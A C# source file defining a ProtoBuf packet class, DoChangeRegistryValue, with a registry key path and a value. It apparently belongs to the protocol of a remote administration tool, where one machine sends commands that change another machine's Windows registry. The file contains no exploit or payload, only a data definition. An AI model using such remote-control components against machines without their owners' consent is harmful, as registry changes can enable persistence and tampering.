using ProtoBuf;
using Quasar.Common.Registry;

namespace Quasar.Common.Packets
{
    [ProtoContract]
    public class DoChangeRegistryValue : IPacket
    {
        [ProtoMember(1)]
        public string KeyPath { get; set; }

        [ProtoMember(2)]
        public RegValueData Value { get; set; }
    }
}
